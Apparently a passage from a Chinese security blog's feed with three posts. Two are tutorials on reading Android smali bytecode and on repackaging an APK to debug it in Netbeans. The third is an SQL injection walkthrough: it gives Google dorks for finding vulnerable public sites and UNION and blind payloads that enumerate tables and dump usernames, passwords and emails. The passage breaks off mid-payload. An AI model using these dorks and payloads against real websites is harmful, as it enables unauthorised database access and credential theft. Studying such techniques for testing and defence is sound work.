<span class="keyword">.method</span><span class="keyword"> protected</span><span class="function"> onCreate(</span><span class="class">Landroid/os/Bundle;</span><span class="function">)</span>V
<span class="keyword">    .locals</span> 2
<span class="keyword">    .param</span> <span class="variable">p1</span>, <span class="string">"savedInstanceState"</span>    <span class="comment"># Landroid/os/Bundle;</span>
<span class="keyword">    .prologue</span>
<span class="keyword">    .line</span> 18
   <span class="instruction"> invoke-super </span>{<span class="variable">p0</span>, <span class="variable">p1</span>}, <span class="class">Landroid/app/Activity;</span><span class="function">-&gt;onCreate(</span><span class="class">Landroid/os/Bundle;</span><span class="function">)</span>V
<span class="keyword">    .line</span> 19
   <span class="instruction"> const </span><span class="variable">v1</span>, 0x7f040017
   <span class="instruction"> invoke-virtual </span>{<span class="variable">p0</span>, <span class="variable">v1</span>}, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton;</span><span class="function">-&gt;setContentView(</span>I<span class="function">)</span>V
<span class="keyword">    .line</span> 20
   <span class="instruction"> const </span><span class="variable">v1</span>, 0x7f090040
   <span class="instruction"> invoke-virtual </span>{<span class="variable">p0</span>, <span class="variable">v1</span>}, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton;</span><span class="function">-&gt;findViewById(</span>I<span class="function">)</span><span class="class">Landroid/view/View;</span>
   <span class="instruction"> move-result-object </span><span class="variable">v0</span>
   <span class="instruction"> check-cast </span><span class="variable">v0</span>, <span class="class">Landroid/widget/Button;</span>
<span class="keyword">    .line</span> 21
<span class="keyword">    .local</span> <span class="variable">v0</span>, <span class="string">"button"</span>:<span class="class">Landroid/widget/Button;</span>
   <span class="instruction"> new-instance </span><span class="variable">v1</span>, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1;</span>
   <span class="instruction"> invoke-direct </span>{<span class="variable">v1</span>, <span class="variable">p0</span>}, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1;</span><span class="function">-&gt;&lt;init&gt;(</span><span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton;</span><span class="function">)</span>V
   <span class="instruction"> invoke-virtual </span>{<span class="variable">v0</span>, <span class="variable">v1</span>}, <span class="class">Landroid/widget/Button;</span><span class="function">-&gt;setOnClickListener(</span><span class="class">Landroid/view/View$OnClickListener;</span><span class="function">)</span>V
<span class="keyword">    .line</span> 36
   <span class="instruction"> return-void
</span><span class="keyword">.end method</span>
</code></pre><h3 id="翻译smali代码">翻译smali代码</h3><p>第1行：</p>
<pre><code><span class="preprocessor"># virtual methods 注释后是虚方法</span>
</code></pre><p>第2行：</p>
<pre><code>.<span class="keyword">method</span> protected onCreate(<span class="type">Landroid</span>/os/<span class="type">Bundle</span>;)V
</code></pre><p>这里先简单了解一下alvik字节码，详细参考：<a href="http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html" target="_blank" rel="external">dalvik_opcodes</a></p>
<p>alvik字节码有类型两种，原始类型和引用类型。对象和数组是引用类型，其它都是原始类型。</p>
<pre><code>V    <span class="keyword">void</span>，只能用于返回值类型
Z    <span class="keyword">boolean</span>
B    <span class="keyword">byte</span>
S    <span class="keyword">short</span>
C    <span class="keyword">char</span>
I    <span class="keyword">int</span>
J    <span class="keyword">long</span>（<span class="number">64</span>位）
F    <span class="keyword">float</span>
D    <span class="keyword">double</span>(<span class="number">64</span>位)
</code></pre><p>对象以Lpackage/name/ObjectName;的表示形式。前面的L表示这是一个对象类型，package/name/是该对象所在的包，ObjectName是对象的名字，“;”表示对象名称的结束。相当于java中的package.name.ObjectName。</p>
<p>了解了这些再看第2行代码：<br>onCreate函数参数为一个对象类型，对象名为Bundle， 该对象所在的包为android/os，对应java中android.os.Bundle</p>
<p>第3行：</p>
<pre><code><span class="class">.locals</span> <span class="number">2</span>
</code></pre><p>标明了你在这个函数中最少要用到的本地寄存器的个数为2，即指定了使用的局部变量的个数</p>
<p>第4行：</p>
<pre><code>.<span class="built_in">param</span> p1, <span class="string">"savedInstanceState"</span>    <span class="comment"># Landroid/os/Bundle;</span>
</code></pre><p>“.parameter”指定了方法的参数，每个”.parameter”指令表明使用一个参数，比如方法中有使用到3个参数，那么就会出现3条“.parameter”指令。</p>
<p>第6-7行：</p>
<pre><code>“<span class="class">.prologue</span>” <span class="class">.line</span>
</code></pre><p>“.prologue”指定了代码的开始处，混淆过的代码可能去掉了该指令。<br>“.line”指定了该处指令在源代码中的行号，同样的，混淆过的代码可能去除了行号信息。</p>
<p>第8行：</p>
<pre><code>invoke-<span class="keyword">super</span> {p0, p1}, Landroid<span class="regexp">/app/</span>Activity;-&gt;onCreate(Landroid<span class="regexp">/os/</span>Bundle;)V
</code></pre><p>这里先了解一下寄存器和函数调用方法</p>
<h4 id="寄存器">寄存器</h4><p>在smali里的所有操作都必须经过寄存器来进行</p>
<p>本地寄存器用v开头数字结尾的符号来表示，如v0、v1、v2、…<br>参数寄存器则使用p开头数字结尾的符号来表示，如p0、p1、p2、…<br>特别注意的是，p0不一定是函数中的第一个参数<br>在非static函数中，p0代指“this”，p1表示函数的第一个参数，p2代表函数中的第二个参数…<br>而在static函数中p0才对应第一个参数（因为Java的static方法中没有this方法）<br>本地寄存器没有限制，理论上是可以任意使用的。</p>
<p>再看代码，这里寄存器p1 = “savedInstanceState”，后边将用作传参</p>
<h4 id="函数">函数</h4><p>smali中的函数和成员变量一样也分为两种类型，但是不同成员变量中的static和instance之分，而是direct和virtual之分。<br>那么direct method和virtual method有什么区别呢？直白地讲，direct method就是private函数，其余的public和protected函数都属于virtual method。</p>
<p>表示形式</p>
<pre><code>Lpackage/name/ObjectName;-&gt;MethodName(III)Z
Lpackage/name/ObjectName;表示类型，MethodName是方法名。III为参数（在此是<span class="number">3</span>个整型参数），Z是返回类型（<span class="keyword">bool</span>型）。
方法的参数是一个接一个的，中间没有隔开。
</code></pre><p>调用方式</p>
<p>调用函数时，有invoke-direct，invoke-virtual，另外还有invoke-static、invoke-super以及invoke-interface等几种不同的指令。<br>当然其实还有invoke-XXX/range 指令的，这是参数多于4个的时候调用的指令，比较少见，了解下即可。<br>invoke-static：顾名思义就是调用static函数的，因为是static函数，所以比起其他调用少一个参数this指针。<br>invoke-super：调用父类方法用的指令，在onCreate、onDestroy等方法都能看到。<br>invoke-direct：调用private函数的。<br>invoke-virtual：用于调用protected或public函数，同样注意修改smali时不要错用invoke-direct或invoke-static<br>invoke-xxxxx/range：当方法的参数多于5个时（含5个），不能直接使用以上的指令，而是在后面加上“/range”</p>
<p>再看代码，调用父类android.app.Activity的onCreate方法，参数为p1 = “savedInstanceState” 类型为android.os.Bundle，返回类型为void型，其中p0为this指针</p>
<h2 id="完整注释">完整注释</h2><p>主类代码详细注释如下所示：</p>
<pre><code><span class="comment"># virtual methods</span>
<span class="keyword">.method</span><span class="keyword"> protected</span><span class="function"> onCreate(</span><span class="class">Landroid/os/Bundle;</span><span class="function">)</span>V
<span class="keyword">    .locals</span> 2
    <span class="comment"># 标明了你在这个函数中最少要用到的本地寄存器的个数</span>
<span class="keyword">    .param</span> <span class="variable">p1</span>, <span class="string">"savedInstanceState"</span>    <span class="comment"># Landroid/os/Bundle;</span>
    <span class="comment"># 指定了方法的参数</span>
<span class="keyword">    .prologue</span>
    <span class="comment"># 代码的开始处</span>
<span class="keyword">    .line</span> 18
    <span class="comment"># 该处指令在源代码中的行号</span>
   <span class="instruction"> invoke-super </span>{<span class="variable">p0</span>, <span class="variable">p1</span>}, <span class="class">Landroid/app/Activity;</span><span class="function">-&gt;onCreate(</span><span class="class">Landroid/os/Bundle;</span><span class="function">)</span>V
    <span class="comment"># 调用父类android.app.Activity的onCreate方法，参数为p1 = "savedInstanceState" 类型为android.os.Bundle, 返回类型为void型。其中p0为this引用</span>
<span class="keyword">    .line</span> 19
   <span class="instruction"> const </span><span class="variable">v1</span>, 0x7f040017
    <span class="comment"># 使用了v1本地寄存器，并把值0x7f040017存到v1中</span>
   <span class="instruction"> invoke-virtual </span>{<span class="variable">p0</span>, <span class="variable">v1</span>}, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton;</span><span class="function">-&gt;setContentView(</span>I<span class="function">)</span>V
    <span class="comment"># 调用了public com.reverse.idhyt.androidreverse.ClickButton的setContentView方法， 参数为v1 = 0x7f040017(参考源码可知该值表示布局文件), 返回类型为void型</span>
<span class="keyword">    .line</span> 20
   <span class="instruction"> const </span><span class="variable">v1</span>, 0x7f090040
    <span class="comment"># 使用了v1本地寄存器，并把值0x7f090040存到v1中</span>
   <span class="instruction"> invoke-virtual </span>{<span class="variable">p0</span>, <span class="variable">v1</span>}, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton;</span><span class="function">-&gt;findViewById(</span>I<span class="function">)</span><span class="class">Landroid/view/View;</span>
    <span class="comment"># 调用了public com.reverse.idhyt.androidreverse.ClickButton的findViewById方法， 参数为v1 = 0x7f090040(参考源码可知该值表示一个button按钮), 返回类型为void型</span>
   <span class="instruction"> move-result-object </span><span class="variable">v0</span>
    <span class="comment"># 将findViewById的返回对象存入寄存器v0中，用法参考-&gt;函数返回结果</span>
   <span class="instruction"> check-cast </span><span class="variable">v0</span>, <span class="class">Landroid/widget/Button;</span>
    <span class="comment"># 检测v0的对象引用是否可实例化</span>
    <span class="comment"># Dalvik opcodes </span>
    <span class="comment"># Opcode name: check-cast vx, type_id</span>
    <span class="comment"># Explanation: Checks whether the object reference in vx can be cast to an instance of a class referenced by type_id. Throws ClassCastException if the cast is not possible, continues execution otherwise.</span>
<span class="keyword">    .line</span> 21
<span class="keyword">    .local</span> <span class="variable">v0</span>, <span class="string">"button"</span>:<span class="class">Landroid/widget/Button;</span>
    <span class="comment"># v0 = "button"(源码中定义的变量名) 类型 android/widget/Button</span>
   <span class="instruction"> new-instance </span><span class="variable">v1</span>, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1;</span>
    <span class="comment"># 创建类实例 vi = com.reverse.idhyt.androidreverse.ClickButton$1 即类ClickButton$1实例化</span>
   <span class="instruction"> invoke-direct </span>{<span class="variable">v1</span>, <span class="variable">p0</span>}, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1;</span><span class="function">-&gt;&lt;init&gt;(</span><span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton;</span><span class="function">)</span>V
    <span class="comment"># 调用类ClickButton$1的private函数init, 参数为p0 类型为com.reverse.idhyt.androidreverse.ClickButton, 其中v1为类对象本身，即this</span>
   <span class="instruction"> invoke-virtual </span>{<span class="variable">v0</span>, <span class="variable">v1</span>}, <span class="class">Landroid/widget/Button;</span><span class="function">-&gt;setOnClickListener(</span><span class="class">Landroid/view/View$OnClickListener;</span><span class="function">)</span>V
    <span class="comment"># 调用类android.widget.Button中定义的一个pravite函数setOnClickListener</span>
    <span class="comment"># 参数v0为android.widget.Button, v1为传递给setOnClickListener方法的Landroid/view/View$OnClickListener参数</span>
    <span class="comment"># 即为button按钮添加了一个点击监听事件，其实现代码在v1 = ClickButton$1中</span>
</code></pre><p>button点击事件代码</p>
<pre><code><span class="comment"># virtual methods</span>
<span class="keyword">.method</span><span class="keyword"> public</span><span class="function"> onClick(</span><span class="class">Landroid/view/View;</span><span class="function">)</span>V
<span class="keyword">    .locals</span> 3
<span class="keyword">    .param</span> <span class="variable">p1</span>, <span class="string">"v"</span>    <span class="comment"># Landroid/view/View;</span>
<span class="keyword">    .prologue</span>
<span class="keyword">    .line</span> 24
   <span class="instruction"> new-instance </span><span class="variable">v0</span>, <span class="class">Landroid/app/AlertDialog$Builder;</span>
    <span class="comment"># v0 = this 对照源码：new AlertDialog.Builder()</span>
   <span class="instruction"> iget-object </span><span class="variable">v1</span>, <span class="variable">p0</span>, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1;</span>-&gt;this$0:<span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton;</span>
    <span class="comment"># 调用对象 ClickButton.this 对照源码 new AlertDialog.Builder(ClickButton.this)</span>
   <span class="instruction"> invoke-direct </span>{<span class="variable">v0</span>, <span class="variable">v1</span>}, <span class="class">Landroid/app/AlertDialog$Builder;</span><span class="function">-&gt;&lt;init&gt;(</span><span class="class">Landroid/content/Context;</span><span class="function">)</span>V
    <span class="comment"># 初始化Context</span>
<span class="keyword">    .line</span> 25
<span class="keyword">    .local</span> <span class="variable">v0</span>, <span class="string">"alert"</span>:<span class="class">Landroid/app/AlertDialog$Builder;</span>
    <span class="comment"># v0 = "alert" 类型：android/app/AlertDialog$Builder</span>
   <span class="instruction"> const-string </span><span class="variable">v1</span>, <span class="string">"hello world"</span>
    <span class="comment"># v1 = "hello world"</span>
   <span class="instruction"> invoke-virtual </span>{<span class="variable">v0</span>, <span class="variable">v1</span>}, <span class="class">Landroid/app/AlertDialog$Builder;</span><span class="function">-&gt;setTitle(</span><span class="class">Ljava/lang/CharSequence;</span><span class="function">)</span><span class="class">Landroid/app/AlertDialog$Builder;</span>
    <span class="comment"># 调用v0的setTitle方法，返回类型为android/app/AlertDialog$Builder，对应源码alert.setTitle("hello world")</span>
<span class="keyword">    .line</span> 26
   <span class="instruction"> const-string </span><span class="variable">v1</span>, <span class="string">"exit"</span>
    <span class="comment"># v1 = "exit"</span>
   <span class="instruction"> new-instance </span><span class="variable">v2</span>, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1$1;</span>
    <span class="comment"># 重新实例化一个clickButton类</span>
   <span class="instruction"> invoke-direct </span>{<span class="variable">v2</span>, <span class="variable">p0</span>}, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1$1;</span><span class="function">-&gt;&lt;init&gt;(</span><span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1;</span><span class="function">)</span>V
    <span class="comment"># ClickButton$1$1初始化，其父类为ClickButton$1</span>
   <span class="instruction"> invoke-virtual </span>{<span class="variable">v0</span>, <span class="variable">v1</span>, <span class="variable">v2</span>}, <span class="class">Landroid/app/AlertDialog$Builder;</span><span class="function">-&gt;setPositiveButton(</span><span class="class">Ljava/lang/CharSequence;</span><span class="class">Landroid/content/DialogInterface$OnClickListener;</span><span class="function">)</span><span class="class">Landroid/app/AlertDialog$Builder;</span>
    <span class="comment"># 调用v0的setPositiveButton方法，参数为v1, v2, v1 ="exit", v2 = DialogInterface$OnClickListener,即在exit按钮上添加了一个监听事件v2:ClickButton$1$1</span>
<span class="keyword">    .line</span> 33
   <span class="instruction"> invoke-virtual </span>{<span class="variable">v0</span>}, <span class="class">Landroid/app/AlertDialog$Builder;</span><span class="function">-&gt;show(</span><span class="function">)</span><span class="class">Landroid/app/AlertDialog;</span>
    <span class="comment"># 调用v0的show方法</span>
<span class="keyword">    .line</span> 34
   <span class="instruction"> return-void
</span><span class="keyword">.end method</span>
</code></pre><p>exit退出事件代码</p>
<pre><code><span class="comment"># virtual methods</span>
<span class="keyword">.method</span><span class="keyword"> public</span><span class="function"> onClick(</span><span class="class">Landroid/content/DialogInterface;</span>I<span class="function">)</span>V
<span class="keyword">    .locals</span> 1
<span class="keyword">    .param</span> <span class="variable">p1</span>, <span class="string">"dialog"</span>    <span class="comment"># Landroid/content/DialogInterface;</span>
<span class="keyword">    .param</span> <span class="variable">p2</span>, <span class="string">"which"</span>    <span class="comment"># I</span>
    <span class="comment"># 传参 p1, p2, #后边为参数类型</span>
<span class="keyword">    .prologue</span>
<span class="keyword">    .line</span> 29
   <span class="instruction"> invoke-interface </span>{<span class="variable">p1</span>}, <span class="class">Landroid/content/DialogInterface;</span><span class="function">-&gt;dismiss(</span><span class="function">)</span>V
    <span class="comment"># 调用dialog中的dismiss()接口</span>
<span class="keyword">    .line</span> 30
   <span class="instruction"> iget-object </span><span class="variable">v0</span>, <span class="variable">p0</span>, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1$1;</span>-&gt;this$1:<span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1;</span>
   <span class="instruction"> iget-object </span><span class="variable">v0</span>, <span class="variable">v0</span>, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1;</span>-&gt;this$0:<span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton;</span>
   <span class="instruction"> invoke-virtual </span>{<span class="variable">v0</span>}, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton;</span><span class="function">-&gt;finish(</span><span class="function">)</span>V
    <span class="comment"># 以上三行找到顶级父类对象，并调用finish关闭Activity</span>
<span class="keyword">    .line</span> 31
   <span class="instruction"> return-void
</span><span class="keyword">.end method</span>
</code></pre><h2 id="其他">其他</h2><h3 id="函数返回结果">函数返回结果</h3><p>在Java代码中调用函数和返回函数结果是一条语句完成的，而在smali里则需要分开来完成，在使用上述指令后，如果调用的函数返回非void，那么还需要用到move-result（返回基本数据类型）和move-result-object（返回对象）指令</p>
<h3 id="数组的表示形式">数组的表示形式</h3><p>[I——表示一个整型一维数组，相当于java中的int[]。<br>对于多维数组，只要增加[就行了。[[I相当于int[][]，[[[I相当于int[][][]。注意每一维的最多255个。<br>对象数组的表示：[Ljava/lang/String;表示一个String对象数组。</p>
<h3 id="字段的表示形式：">字段的表示形式：</h3><p>Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String;<br>即包名，字段名和各字段类型。</p>
<h3 id="寄存器-1">寄存器</h3><p>在dalvik字节码中，寄存器都是32位的，能够支持任何类型。64位类型（Long和Double型）用2个寄存器表示。<br>有两种方式指定一个方法中有多少寄存器是可用的,.registers指令指定了方法中寄存器的总数,.locals指令表明了方法中非参寄存器的数量。</p>
<p>方法的传参<br>1.当一个方法被调用的时候，方法的参数被置于最后N个寄存器中。如果一个方法有2个参数，5个寄存器（v0-v4），那么参数将置于最后2个寄存器——v3和v4。</p>
<p>2.非静态方法中的第一个参数总是调用该方法的对象。<br>例如，非静态方法LMyObject;-&gt;callMe(II)V有2个整型参数，另外还有一个隐含的LMyObject;参数，所以总共有3个参数。<br>假如在该方法中指定了5个寄存器（v0-v4），以.registers方式指定5个或以.locals方式指定2个(即2个local寄存器+3个参数寄存器)。<br>当该方法被调用的时候，调用该方法的对象（即this引用）存放在v2中，第一个整型参数存放在v3中，第二个整型参数存放在v4中。</p>
<p>3.对于静态方法除了没有隐含的this参数外其它都一样。</p>
<h2 id="参考">参考</h2><p>1.函数调用部分参考 <a href="http://blog.csdn.net/lpohvbe/article/details/7981386" target="_blank" rel="external">APK反编译之一：基础知识</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>安卓逆向笔记,熟悉smali语法和函数调用<br>一个按钮程序,实现功能：点击 - 弹窗 - 退出</p>
<h2 id="源码">源码</h2><p>主功能代码</p>
<figure class="highlight java"><table><tr><td class]]>
    </summary>
    
      <category term="smali" scheme="http://blog.idhyt.com/tags/smali/"/>
    
      <category term="android" scheme="http://blog.idhyt.com/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Netbeans动态调试smali文件]]></title>
    <link href="http://blog.idhyt.com/2015/05/08/android-netbeans-debug-smali/"/>
    <id>http://blog.idhyt.com/2015/05/08/android-netbeans-debug-smali/</id>
    <published>2015-05-08T13:11:11.000Z</published>
    <updated>2015-12-27T08:55:30.000Z</updated>
    <content type="html"><![CDATA[<p>通过修改apk包来实现动态调试smali文件。</p>
<h2 id="调试工具">调试工具</h2><p><a href="https://netbeans.org/features/java/index.html" target="_blank" rel="external">Netbeans</a>java版本即可<br><a href="https://ibotpeaches.github.io/Apktool/" target="_blank" rel="external">apktool</a>解包打包<br><a href="https://code.google.com/p/signapk/downloads/list" target="_blank" rel="external">signapk</a>签名</p>
<h2 id="生成可供调试的apk">生成可供调试的apk</h2><p>以app-release.apk说明</p>
<h3 id="解包">解包</h3><pre><code>java -jar apktool<span class="class">.jar</span> d -d app-release<span class="class">.apk</span> 
</code></pre><p>-d参数用于生成调试版本，最后边可加参数 -o out 解包到指定out目录</p>
<h3 id="找到入口函数">找到入口函数</h3><p>通过查看AndroidManifest.xml获得入口activity，然后找到oncreate()函数。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-netbeans-debug-smali-1.png" alt=""></p>
<h3 id="添加调试代码">添加调试代码</h3><p>在入口函数代码</p>
<pre><code>invoke-<span class="keyword">super</span> {p0, p1}, Landroid<span class="regexp">/app/</span>Activity;-&gt;onCreate(Landroid<span class="regexp">/os/</span>Bundle;)V
</code></pre><p>添加调试代码</p>
<pre><code>invoke-<span class="keyword">static</span> {}, Landroid<span class="regexp">/os/</span>Debug;-&gt;waitForDebugger()V
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-netbeans-debug-smali-2.png" alt="">    </p>
<h3 id="重打包">重打包</h3><p>apktool重打包，命令</p>
<pre><code>java -jar apktool<span class="class">.jar</span> <span class="tag">b</span> app-release -o debug.apk
</code></pre><p>打包过后解包文件根目录会出现一个build目录（后期调试需要将其删除）</p>
<h3 id="签名">签名</h3><pre><code><span class="tag">java</span> <span class="tag">-jar</span> "<span class="tag">signapk</span><span class="class">.jar</span>" "<span class="tag">testkey</span><span class="class">.x509</span><span class="class">.pem</span>" "<span class="tag">testkey</span><span class="class">.pk8</span>" <span class="tag">debug</span><span class="class">.apk</span> <span class="tag">debug-sign</span><span class="class">.apk</span>
</code></pre><p>成功生成了一个支持调试的debug-sign.apk文件</p>
<p>可以写一个批处理文件apksign.bat</p>
<pre><code><span class="variable">@echo</span> off
set PATH=<span class="variable">%CD</span><span class="variable">%;</span><span class="variable">%PATH</span><span class="variable">%;</span>
java -jar <span class="string">"%~dp0signapk.jar"</span> <span class="string">"%~dp0testkey.x509.pem"</span> <span class="string">"%~dp0testkey.pk8"</span> <span class="variable">%1</span> <span class="variable">%2</span>
</code></pre><p>签名时直接输入 signapk.bat old.apk new.apk</p>
<h3 id="安装apk">安装apk</h3><p>虚拟机安装重新打包签名的调试debug-sign.apk，这里我用的虚拟机为genymotion</p>
<h2 id="netbeans设置">netbeans设置</h2><p>1.删除out目录下的build文件夹</p>
<p>2.打开netbeans，选择“文件”-“新建项目”-“基于现有源代码的java项目”<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-netbeans-debug-smali-3.png" alt="">  </p>
<p>3.在“项目文件夹处”选择apk解包目录<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-netbeans-debug-smali-4.png" alt="">  </p>
<p>4.在“源包文件夹”出选择解包目录下的smali文件夹<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-netbeans-debug-smali-5.png" alt="">  </p>
<p>5.点击完成，项目创建完毕</p>
<p>6.在模拟器中运行刚刚安装的重新打包附带签名的debug-sign.apk，程序会处于挂起状态</p>
<p>7.在netbeans中找到入口activity的oncreate函数，在刚才添加的调试代码下一行下代码断点<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-netbeans-debug-smali-6.png" alt="">  </p>
<p>8.在netbeans中，选择“调试”-“连接调试器”,设置如下<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-netbeans-debug-smali-7.png" alt=""> </p>
<p>连接过后程序会暂停到断点处，接下来就可以进行单步调试了。</p>
<p>9.端口号可在DDMS中查看<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-netbeans-debug-smali-8.png" alt=""> </p>
<h2 id="参考">参考</h2><p><a href="http://0nly3nd.sinaapp.com/?p=576" target="_blank" rel="external">Netbeans 6.8 + apktool_2.0.0b9 动态调试smali文件</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>通过修改apk包来实现动态调试smali文件。</p>
<h2 id="调试工具">调试工具</h2><p><a href="https://netbeans.org/features/java/index.html" target="_blank" rel="extern]]>
    </summary>
    
      <category term="debug" scheme="http://blog.idhyt.com/tags/debug/"/>
    
      <category term="android" scheme="http://blog.idhyt.com/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[SQL注入测试思路]]></title>
    <link href="http://blog.idhyt.com/2015/04/21/technic-sql-inject/"/>
    <id>http://blog.idhyt.com/2015/04/21/technic-sql-inject/</id>
    <published>2015-04-21T06:46:11.000Z</published>
    <updated>2015-12-31T11:53:10.000Z</updated>
    <content type="html"><![CDATA[<p>SQL注入测试思路整理</p>
<h2 id="一-搜索可能有漏洞的网站">一.搜索可能有漏洞的网站</h2><p>利用google收集信息，可以搜索的关键词很多，网上有个术语，把这些称作“Google Dorks”</p>
<pre><code><span class="string">inurl:</span>index.php?id=
inurl:gallery.php?id=
inurl:article.php?id=
inurl:pageid=
<span class="string">site:</span> <span class="string">http:</span><span class="comment">// www.<span class="label">xxx.com  inurl:php?id= //针对某个特定的网站</span></span>
</code></pre><h2 id="二-检测一下目标是否有明显漏洞">二.检测一下目标是否有明显漏洞</h2><p>搜索结果会出来一大堆，一个简单的测试方式是在Url末尾的数字后面加单引号或者加上 and 1=1 或者 1=2<br>看看界面是否有明显变化或者直接就给出SQL的报错语句了。</p>
<pre><code><span class="keyword">http</span>://localhost/test/<span class="built_in">get</span>.php?id=<span class="number">1</span> <span class="operator">and</span> <span class="number">1</span>=<span class="number">1</span>
<span class="keyword">http</span>://localhost/test/<span class="built_in">get</span>.php?id=<span class="number">1</span> <span class="operator">and</span> <span class="number">1</span>=<span class="number">2</span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-1.png" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-2.png" alt=""></p>
<h2 id="三-看看该表有多少个字段">三.看看该表有多少个字段</h2><p>测试语句： order by number<br>一般从小往大的尝试，比如1,2,3,4,5都能看见网页界面，然后6就报错了，那么很明显这个网页对应的表只有5个字段</p>
<h2 id="四-找到有漏洞的字段">四.找到有漏洞的字段</h2><p>将存在注入点的字段值改为负，目的是不显示数据<br>然后注入语句为 union select 1,2,3,4,5 (数字为字段个数)<br>找到漏洞的字段，即能被显示出来的字段，用于显示获取的注入信息</p>
<h2 id="五-找到对应的版本号，数据库和用户">五.找到对应的版本号，数据库和用户</h2><p>将第四部显示的字段值分别替换version(), user(), database()获取数据库信息<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-3.png" alt=""></p>
<h2 id="六-爆库">六.爆库</h2><h3 id="MySql-version()_&gt;_5">MySql.version() &gt; 5</h3><p>如果获取的版本为Mysql 5以上，则有内置库information_schema，存储着mysql的所有数据库和表结构信息</p>
<h4 id="1-获取该库下其他表">1.获取该库下其他表</h4><p>将漏洞字段替换为group_concat(table_name) 然后语句后边添加 from information_schema.tables where table_schema=database()</p>
<pre><code>http://localhost/test/get.php?id=-1 union <span class="operator"><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-4.png" alt=""></p>
<h4 id="2-获取表中字段名">2.获取表中字段名</h4><p>把”group_concat(table_name)”替换成”group_concat(column_name)”<br>把”from information_schema.tables where table_schema=database()–” 替换成”FROM information_schema.columns WHERE table_name=表名—<br>其中表明需要编码</p>
<pre><code>http://localhost/test/get.php?id=-1 union <span class="operator"><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_name=<span class="built_in">CHAR</span>(<span class="number">115</span>, <span class="number">113</span>, <span class="number">108</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>) //table_name = sqlinject</span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-5.png" alt=""></p>
<h4 id="3-查询表获得账户等信息">3.查询表获得账户等信息</h4><p>例如获取user,password,email 字段内容<br>用group_concat(user,0x3a, password,0x3a, email)替换之前内容，数据库选择sqlinject，其中0x3a为分隔符</p>
<pre><code>http://localhost/test/get.php?id=-1 union <span class="operator"><span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">user</span>,<span class="number">0x3a</span>, <span class="keyword">password</span>,<span class="number">0x3a</span>, email),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> sqlinject</span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-6.png" alt=""></p>
<h3 id="MySql-version()_&lt;_5">MySql.version() &lt; 5</h3><p>如果获取的版本为Mysql 5以下，就需要暴力猜解表名</p>
<h4 id="1-猜解表名">1.猜解表名</h4><p>一般的表的名称无非是admin adminuser user pass password 等</p>
<pre><code><span class="keyword">and</span> <span class="number">0</span>&lt;&gt;(<span class="keyword">select</span> count<span class="comment">(*) from *)</span>
<span class="keyword">and</span> <span class="number">0</span>&lt;&gt;(<span class="keyword">select</span> count<span class="comment">(*) from admin) — 判断是否存在admin这张表</span>
</code></pre><h4 id="2-猜帐号数目">2.猜帐号数目</h4><p>如果遇到0&lt; 返回正确页面 1&lt;返回错误页面说明帐号数目就是1个</p>
<pre><code><span class="keyword">and</span> <span class="number">0</span>&lt;(<span class="keyword">select</span> count<span class="comment">(*) from admin)
and 1&lt;(select count(*)</span> <span class="keyword">from</span> admin)
</code></pre><h4 id="3-猜解字段名称">3.猜解字段名称</h4><p>一般字段名是user,password,name,pwd,email,phone等<br>在len( ) 括号里面加上我们想到的字段名称.</p>
<pre><code><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> count<span class="comment">(*) from admin where len(*)</span>&gt;<span class="number">0</span>)–
<span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> count<span class="comment">(*) from admin where len(用户字段名称name)&gt;0)
